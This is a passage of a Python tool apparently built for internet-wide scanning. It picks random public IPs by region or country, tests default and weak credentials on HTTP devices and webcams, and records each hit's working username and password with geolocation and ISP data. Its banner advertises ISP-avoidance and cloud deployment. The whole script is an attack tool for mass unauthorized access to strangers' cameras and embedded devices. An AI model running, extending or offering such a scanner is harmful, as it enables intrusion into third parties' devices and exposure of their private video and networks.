    if not blocks:
        return generate_internet_ips(count)
    ips = []
    while len(ips) < count:
        s, e = random.choice(blocks)
        ip_int = random.randint(s, e)
        ip_str = str(ipaddress.IPv4Address(ip_int))
        if is_public_ip(ip_str):
            ips.append(ip_str)
    return ips


def generate_region_ips(region_name, count, include_countries=None, exclude_countries=None):
    config = REGION_CONFIG.get(region_name)
    if not config:
        print(f"  [!] Unknown region: {region_name}", file=sys.stderr)
        return generate_internet_ips(count)

    if include_countries is None and "countries" in config:
        include_countries = config["countries"]

    rirs = config["rirs"]
    if len(rirs) == 1:
        rir = rirs[0]
        if region_name == "subsaharan":
            exclude_countries = SSA_EXCLUDED_COUNTRIES
        return generate_rir_ips(rir, count, include_countries=include_countries, exclude_countries=exclude_countries)

    prefetch_rir_data(rirs)
    ips = []
    per_rir = max(count // len(rirs), 1)
    for rir in rirs:
        rir_exclude = exclude_countries if rir == "afrinic" and region_name == "subsaharan" else None
        rir_include = include_countries if include_countries else None
        rir_ips = generate_rir_ips(rir, per_rir, include_countries=rir_include, exclude_countries=rir_exclude)
        ips.extend(rir_ips)
        if len(ips) >= count:
            break
    random.shuffle(ips)
    return ips[:count]


class RateLimiter:
    def __init__(self, rate):
        self.rate = rate
        self.tokens = float(rate)
        self.last_refill = time.monotonic()
        self.lock = threading.Lock()

    def acquire(self):
        with self.lock:
            now = time.monotonic()
            self.tokens = min(self.rate, self.tokens + (now - self.last_refill) * self.rate)
            self.last_refill = now
            if self.tokens >= 1:
                self.tokens -= 1
                return
            wait = (1 - self.tokens) / self.rate
            time.sleep(wait)
            self.tokens = 0
            self.last_refill = time.monotonic()


class GeoEnricher:
    cache = {}
    cache_lock = threading.Lock()
    last_request = 0
    MIN_INTERVAL = 0.1

    @classmethod
    def enrich(cls, ip):
        if not ip or not ipaddress.IPv4Address(ip).is_global:
            return {}
        with cls.cache_lock:
            if ip in cls.cache:
                return cls.cache[ip]
            now = time.time()
            wait = cls.MIN_INTERVAL - (now - cls.last_request)
            if wait > 0:
                time.sleep(wait)
            cls.last_request = time.time()
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,org,isp,as,asname,timezone", timeout=5)
            data = r.json()
            if data.get("status") == "success":
                result = {
                    "country": data.get("country", ""),
                    "country_code": data.get("countryCode", ""),
                    "region": data.get("regionName", ""),
                    "city": data.get("city", ""),
                    "lat": data.get("lat"),
                    "lon": data.get("lon"),
                    "org": data.get("org", ""),
                    "isp": data.get("isp", ""),
                    "as": data.get("as", ""),
                    "timezone": data.get("timezone", ""),
                }
                with cls.cache_lock:
                    cls.cache[ip] = result
                return result
        except Exception:
            pass
        with cls.cache_lock:
            cls.cache[ip] = {}
        return {}

    @classmethod
    def enrich_batch(cls, ips):
        results = {}
        batch = []
        for ip in ips:
            if ip not in cls.cache:
                batch.append(ip)
        if batch:
            try:
                r = requests.post("http://ip-api.com/batch", json=batch, timeout=30)
                if r.status_code == 200:
                    for item in r.json():
                        if item.get("status") == "success":
                            ip = item.get("query", "")
                            result = {
                                "country": item.get("country", ""),
                                "country_code": item.get("countryCode", ""),
                                "region": item.get("regionName", ""),
                                "city": item.get("city", ""),
                                "lat": item.get("lat"),
                                "lon": item.get("lon"),
                                "org": item.get("org", ""),
                                "isp": item.get("isp", ""),
                                "as": item.get("as", ""),
                                "timezone": item.get("timezone", ""),
                            }
                            with cls.cache_lock:
                                cls.cache[ip] = result
            except Exception:
                pass
        for ip in ips:
            results[ip] = cls.cache.get(ip, {})
        return results


def print_banner():
    print(file=sys.stderr)
    print("  +================================================+", file=sys.stderr)
    print("  |     Device Scanner v6.0 — WORLDWIDE            |", file=sys.stderr)
    print("  |  Scans ANY HTTP service on the internet        |", file=sys.stderr)
    print("  |  with default/weak/no credentials              |", file=sys.stderr)
    print("  |  250+ device patterns, 400+ default creds      |", file=sys.stderr)
    print("  |  Rate-limited, jitter, ISP-avoidance mode      |", file=sys.stderr)
    print("  |  6 regions: africa/europe/north-america/asia   |", file=sys.stderr)
    print("  |  latin-america/worldwide + WebCam detection    |", file=sys.stderr)
    print("  |  Geo-enrichment + ultimate CSV output          |", file=sys.stderr)
    print("  |  Deploy-ready: Vercel / Render / Railway       |", file=sys.stderr)
    print("  +================================================+", file=sys.stderr)
    print(file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="Scan IP ranges for embedded devices with default credentials",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.0/24
  %(prog)s --region worldwide                    # 50K random global IPs (all RIRs)
  %(prog)s --region europe                       # 50K European IPs (RIPE)
  %(prog)s --region north-america                # 50K North American IPs (ARIN)
  %(prog)s --region asia                         # 50K Asia Pacific IPs (APNIC)
  %(prog)s --region latin-america                # 50K Latin American IPs (LACNIC)
  %(prog)s --region africa                       # 50K African IPs (AFRINIC)
  %(prog)s --region worldwide --max-ips 1000000  # 1M global IPs
  %(prog)s --region europe --country GB,DE,FR    # specific countries
  %(prog)s --region africa --country ZA,NG,KE    # African countries
  %(prog)s --region worldwide --geo              # with geo-enrichment
  %(prog)s --region worldwide -o results.csv --output-format csv  # CSV output (ultimate)
  %(prog)s --region worldwide --no-auth-only     # only open devices
  %(prog)s --region worldwide --all-ports        # all ports (slower)
        """,
    )
    parser.add_argument("target", nargs="?", default=None, help="IP range (CIDR, e.g. 192.168.1.0/24), range (e.g. 10.0.0.1-254), or single IP")
    parser.add_argument("-i", "--internet", action="store_true", help="Scan random public IPs on the internet instead of a local range")
    parser.add_argument("--region", default=None, choices=list(REGION_CONFIG.keys()) + [None], help="Scan a specific region: worldwide/europe/north-america/asia/latin-america/africa/subsaharan")
    parser.add_argument("--country", default=None, help="Comma-separated country codes (e.g. GB,DE,FR,ZA,NG,KE)")
    parser.add_argument("--geo", action="store_true", help="Enrich results with geolocation (country/city/org/ISP)")
    parser.add_argument("--output-format", choices=["json", "csv", "ultimate"], default="json", help="Output format: json (default), csv, or ultimate (csv with all geo fields)")
    parser.add_argument("-o", "--output", default=None, help="Output results file")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Thread count (default: 50)")
    parser.add_argument("--rate", type=int, default=200, help="Max IPs per second (default: 200, higher = more aggressive)")
    parser.add_argument("--max-ips", type=int, default=50000, help="Max IPs to scan (default: 50000, use e.g. 10000000 for 10M)")
    parser.add_argument("--show-all", action="store_true", help="Show all devices, not just ones with default creds")
    parser.add_argument("--no-auth-only", action="store_true", help="Only show devices with NO authentication (open interfaces)")
    parser.add_argument("--no-auth", action="store_true", help="Skip credential testing, only identify devices")
    parser.add_argument("--all-ports", action="store_true", help="Scan all ports including webcam/DVR ports (slower)")
    args = parser.parse_args()

    print_banner()

    ports = ALL_PORTS if args.all_ports else SCAN_PORTS

    if args.region:
        include_countries = None
        exclude_countries = None
        if args.country:
            include_countries = set(c.upper().strip() for c in args.country.split(","))
        region_config = REGION_CONFIG.get(args.region)
        if region_config:
            ips = generate_region_ips(args.region, args.max_ips, include_countries=include_countries)
            source_label = f"{args.max_ips} {region_config['label']} IPs"
            if include_countries:
                source_label += f" ({','.join(sorted(include_countries))})"
    elif args.internet:
        print(f"  [*] Internet mode: generating {args.max_ips} random public IPs", file=sys.stderr)
        ips = generate_internet_ips(args.max_ips)
        source_label = f"{args.max_ips} random public IPs"
    else:
        if not args.target:
            parser.error("a target range is required unless --internet or --region is specified")
        print(f"  [*] Parsing target: {args.target}", file=sys.stderr)
        ips = generate_ips(args.target, args.max_ips)
        source_label = args.target

    total = len(ips)
    print(f"  [*] Targets to scan: {total:,}", file=sys.stderr)
    print(f"  [*] Threads: {args.threads}", file=sys.stderr)
    print(f"  [*] Rate limit: {args.rate} IPs/sec", file=sys.stderr)
    print(f"  [*] Connect timeout: 10s", file=sys.stderr)
    print(f"  [*] Ports: {len(ports)} ({', '.join(map(str, ports))})", file=sys.stderr)
    print(f"  [*] Auth combos: {len(DEFAULT_CREDS) + len(WEBCAM_CREDS)}", file=sys.stderr)
    if args.geo:
        print(f"  [*] Geo-enrichment: enabled (ip-api.com)", file=sys.stderr)
    if args.no_auth_only:
        print(f"  [*] Mode: only showing open (no-auth) devices", file=sys.stderr)
    print(file=sys.stderr)

    jobs = queue.Queue()
    for ip in ips:
        jobs.put(ip)

    rate_limiter = RateLimiter(args.rate)

    results = []
    progress_list = [0]
    progress_lock = threading.Lock()
    threads_list = []

    start_time = time.time()
    print(f"  [*] Scanning... (live hits will appear below)", file=sys.stderr)
    print(file=sys.stderr)

    for _ in range(min(args.threads, total)):
        t = threading.Thread(
            target=worker,
            args=(jobs, results, progress_list, progress_lock, total, args.no_auth_only, ports, rate_limiter),
            daemon=True,
        )
        t.start()
        threads_list.append(t)

    jobs.join()

    elapsed = time.time() - start_time
    print(f"\n  [*] Scan completed in {elapsed:.1f}s", file=sys.stderr)

    found_devices = [r for r in results if r["device"]]
    found_creds = [r for r in found_devices if r["auth_found"]]
    found_open = [r for r in found_devices if r["no_auth"]]

    if args.geo and found_devices:
        print(f"  [*] Enriching with geolocation...", file=sys.stderr)
        geo_ips = list(set(r["ip"] for r in found_devices))
        geo_data = GeoEnricher.enrich_batch(geo_ips)
        for r in results:
            g = geo_data.get(r["ip"], {})
            r.update(g)

    print(f"\n  {'='*60}", file=sys.stderr)
    print(f"  RESULTS:", file=sys.stderr)
    print(f"  {'='*60}", file=sys.stderr)
    print(f"  Total HTTP responders:  {len(results)}", file=sys.stderr)
    print(f"  Devices identified:     {len(found_devices)}", file=sys.stderr)
    print(f"  With default creds:     {len(found_creds)}", file=sys.stderr)
    print(f"  Open (no auth):         {len(found_open)}", file=sys.stderr)
    print(f"\n  {'='*60}", file=sys.stderr)

    if found_creds:
        print(f"\n  [!] VULNERABLE — Default credentials found:", file=sys.stderr)
        print(f"  {'-'*60}", file=sys.stderr)
        for r in found_creds:
            geo_part = ""
            if args.geo and r.get("country_code"):
                geo_part = f" [{r['country_code']}][{r.get('org','')[:20]}]"
            print(f"  {r['url']:35s} | {r['device']:25s} | {r['username']}:{r['password']}{geo_part}", file=sys.stderr)

    if found_open and not args.no_auth_only:
        print(f"\n  [!] OPEN — No authentication required:", file=sys.stderr)
        print(f"  {'-'*60}", file=sys.stderr)
        seen = set()
        for r in found_open:
            key = f"{r['ip']}:{r['port']}"
            if key not in seen:
                geo_part = ""
                if args.geo and r.get("country_code"):
                    geo_part = f" [{r['country_code']}][{r.get('org','')[:20]}]"
                print(f"  {r['url']:35s} | {r['device']:25s} | HTTP {r['status_code']}{geo_part}", file=sys.stderr)
                seen.add(key)

    if args.show_all and found_devices:
        others = [r for r in found_devices if not r["auth_found"] and not r["no_auth"]]
        if others:
            print(f"\n  Other devices (with auth):", file=sys.stderr)
            print(f"  {'-'*60}", file=sys.stderr)
            seen = set()
            for r in others:
                key = f"{r['ip']}:{r['port']}"
                if key not in seen:
                    print(f"  {r['url']:35s} | {r['device']:25s} | HTTP {r['status_code']}", file=sys.stderr)
                    seen.add(key)

    if not results:
        print(f"\n  [-] No devices found.", file=sys.stderr)

    if args.output:
        out_format = args.output_format
        if out_format == "csv":
            import csv as csv_mod
            with open(args.output, "w", newline="", encoding="utf-8") as f:
                w = csv_mod.writer(f)
                w.writerow(["ip", "port", "url", "device", "status_code", "no_auth", "auth_found", "username", "password"])
                for r in results:
                    w.writerow([r.get("ip",""), r.get("port",""), r.get("url",""), r.get("device",""),
                               r.get("status_code",""), r.get("no_auth",""), r.get("auth_found",""),
                               r.get("username",""), r.get("password","")])
        elif out_format == "ultimate":
            import csv as csv_mod
            with open(args.output, "w", newline="", encoding="utf-8") as f:
                w = csv_mod.writer(f)
                headers = ["ip", "port", "url", "device", "status_code", "no_auth", "auth_found",
                           "username", "password", "note", "country", "country_code", "region",
                           "city", "lat", "lon", "org", "isp", "as"]
                w.writerow(headers)
                for r in results:
                    w.writerow([r.get("ip",""), r.get("port",""), r.get("url",""), r.get("device",""),
                               r.get("status_code",""), r.get("no_auth",""), r.get("auth_found",""),
                               r.get("username",""), r.get("password",""), r.get("note",""),
                               r.get("country",""), r.get("country_code",""), r.get("region",""),
                               r.get("city",""), r.get("lat",""), r.get("lon",""), r.get("org",""),
                               r.get("isp",""), r.get("as","")])
        else:
            with open(args.output, "w") as f:
                json.dump({
                    "scan_time": datetime.now(timezone.utc).isoformat(),
                    "mode": args.region if args.region else ("internet" if args.internet else "targeted"),
                    "target": source_label,
                    "total_ips": total,
                    "devices_found": len(found_devices),
                    "default_creds_found": len(found_creds),
                    "open_no_auth": len(found_open),
                    "geo_enriched": args.geo,
                    "results": results,
                }, f, indent=2)
        print(f"\n  [*] Results saved to: {args.output} ({out_format})", file=sys.stderr)

    print(file=sys.stderr)


if __name__ == "__main__":
    main()
